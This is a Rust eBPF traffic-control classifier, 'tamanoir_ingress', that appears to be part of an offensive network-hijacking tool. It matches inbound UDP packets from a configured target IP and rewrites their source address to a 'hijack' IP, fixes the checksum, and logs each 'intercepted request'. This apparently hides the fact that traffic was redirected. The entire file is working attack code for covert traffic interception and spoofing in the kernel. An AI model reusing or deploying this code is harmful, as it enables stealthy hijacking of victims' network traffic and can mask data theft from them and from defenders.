use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::{TC_ACT_OK, TC_ACT_PIPE},
    macros::classifier,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
};

use crate::common::{
    update_addr, update_port, UpdateType, HIJACK_IP, IP_SRC_ADDR_OFFSET, TARGET_IP,
    UDP_CSUM_OFFSET, UDP_OFFSET,
};

#[classifier]
pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
    match tc_process_ingress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0)?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
        let addr = header.src_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == target_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");
                let udp_port = &ctx.load::<u16>(UDP_OFFSET)?;
                update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;
                // necessary on some when sockopt SO_NO_CHECK isn't set
                ctx.l4_csum_replace(UDP_CSUM_OFFSET, addr as u64, hijack_ip as u64, 4)
                    .map_err(|_| {
                        error!(ctx, "error: l4_csum_replace");
                        -1
                    })?;

                info!(
                    ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(u32::from_be(addr)),
                    u16::from_be(*udp_port),
                    Ipv4Addr::from_bits(u32::from_be(ctx.load::<u32>(IP_SRC_ADDR_OFFSET).unwrap())),
                    u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
                );
            }
        };
    }

    Ok(TC_ACT_OK)
}
